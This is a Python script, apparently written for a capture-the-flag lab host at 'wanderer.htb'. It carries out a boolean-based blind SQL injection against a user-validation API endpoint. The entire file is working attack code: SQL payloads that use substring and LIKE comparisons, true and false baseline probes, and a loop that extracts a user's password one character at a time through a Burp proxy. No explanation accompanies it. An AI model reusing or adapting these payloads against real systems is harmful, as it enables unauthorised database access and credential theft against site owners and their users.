import requests
import string
import logging
import urllib.parse

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Special characters to include in brute force
special = "!@#$^&*."

# Add proxies to Burp for debugging and error management
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
}

# Define the URL and headers
url = 'http://10.10.110.20/api/v1/user/validate/admin@wanderer.htb'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}

def send_request(payload):
    try:
        # URL-encode the payload to replace spaces with %20 and other special chars
        encoded_payload = urllib.parse.quote(payload, safe='')
        data = f"{encoded_payload}"
        full_url = f"{url}{data}"
        response = requests.get(full_url, headers=headers, proxies=proxies, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        logger.error(f"Request failed: {e}")
        return None

def test_attribute(test_char, position, baseline_true, baseline_false):
    # Use LIKE instead of = to avoid '=' character
    injection = f"' or (select substring(password from {position} for 1) from user limit 1 offset 0) LIKE '{test_char}' -- -"
    response_text = send_request(injection)
    if response_text is None:
        return False
    if response_text != baseline_false and response_text == baseline_true:
        return True
    return False

def exfiltrate_attribute(max_length=30):
    found_string = ""
    characters = string.ascii_letters + string.digits + special
    logger.info(f"[*] Starting exfiltration with character set: {characters}")

    # Get baseline responses for true and false conditions
    baseline_true = send_request("' OR (select 1) like 1 -- -")  # Always true condition
    baseline_false = send_request("' OR (select 1) like 0 -- -")  # Always false condition

    if baseline_true is None or baseline_false is None:
        logger.error("Failed to get baseline responses. Exiting.")
        return ""

    for position in range(1, max_length + 1):
        found_char = None
        logger.info(f"[*] Extracting character at position {position}")
        for char in characters:
            logger.debug(f"[*] Testing character '{char}' at position {position}")
            if test_attribute(char, position, baseline_true, baseline_false):
                found_char = char
                found_string += char
                logger.info(f"[+] Found character '{char}' at position {position}: {found_string}")
                break
        if not found_char:
            logger.info("[!] No matching character found, assuming end of string.")
            break
    return found_string

if __name__ == "__main__":
    logger.info("[*] Starting attribute exfiltration process...")
    exfiltrated_value = exfiltrate_attribute()
    logger.info(f"[+] Exfiltrated value: {exfiltrated_value}")
